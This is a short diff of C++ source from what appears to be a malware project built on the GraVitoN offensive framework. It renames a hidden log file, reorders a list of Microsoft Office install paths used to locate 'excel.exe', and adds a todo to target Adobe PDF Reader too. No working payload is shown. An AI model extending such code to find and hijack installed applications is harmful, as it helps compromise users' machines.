@@ -28,7 +28,7 @@
 #define TARGET_EXEC "excel.exe"
 
 #define GVN_ACTIVATE_LOGGER
-#define GVN_LOG_FILE DARK_PATH"\\graviton_logs.txt"
+#define GVN_LOG_FILE DARK_PATH"\\blackhole_logs.txt"
 #define sayshit(__X__) GraVitoN::Core::Logger::logItLn(__X__)
 
 #include <graviton.hpp>
@@ -38,6 +38,7 @@
 
 const string cwd = GraVitoN::Utils::Directory::cwd().getPath() + "\\";
 const int SP_SIZE = 32;
+// @todo: add adobe pdf reader paths
 const string search_path[] =
 {
 	"C:\\Program Files\\Microsoft Office\\Office10\\",
@@ -48,14 +49,6 @@ const string search_path[] =
 	"C:\\Program Files\\Microsoft Office\\Office15\\",
 	"C:\\Program Files\\Microsoft Office\\root\\Office16\\",
 	"C:\\Program Files\\Microsoft Office\\root\\Office17\\",
-	"D:\\Program Files\\Microsoft Office\\Office10\\",
-	"D:\\Program Files\\Microsoft Office\\Office11\\",
-	"D:\\Program Files\\Microsoft Office\\Office12\\",
-	"D:\\Program Files\\Microsoft Office\\Office13\\",
-	"D:\\Program Files\\Microsoft Office\\Office14\\",
-	"D:\\Program Files\\Microsoft Office\\Office15\\",
-	"D:\\Program Files\\Microsoft Office\\root\\Office16\\",
-	"D:\\Program Files\\Microsoft Office\\root\\Office17\\",
 	"C:\\Program Files (x86)\\Microsoft Office\\Office10\\",
 	"C:\\Program Files (x86)\\Microsoft Office\\Office11\\",
 	"C:\\Program Files (x86)\\Microsoft Office\\Office12\\",
@@ -64,6 +57,14 @@ const string search_path[] =
 	"C:\\Program Files (x86)\\Microsoft Office\\Office15\\",
 	"C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\",
 	"C:\\Program Files (x86)\\Microsoft Office\\root\\Office17\\",
+	"D:\\Program Files\\Microsoft Office\\Office10\\",
+	"D:\\Program Files\\Microsoft Office\\Office11\\",
+	"D:\\Program Files\\Microsoft Office\\Office12\\",
+	"D:\\Program Files\\Microsoft Office\\Office13\\",
+	"D:\\Program Files\\Microsoft Office\\Office14\\",
+	"D:\\Program Files\\Microsoft Office\\Office15\\",
+	"D:\\Program Files\\Microsoft Office\\root\\Office16\\",
+	"D:\\Program Files\\Microsoft Office\\root\\Office17\\",
 	"D:\\Program Files (x86)\\Microsoft Office\\Office10\\",
 	"D:\\Program Files (x86)\\Microsoft Office\\Office11\\",
 	"D:\\Program Files (x86)\\Microsoft Office\\Office12\\",
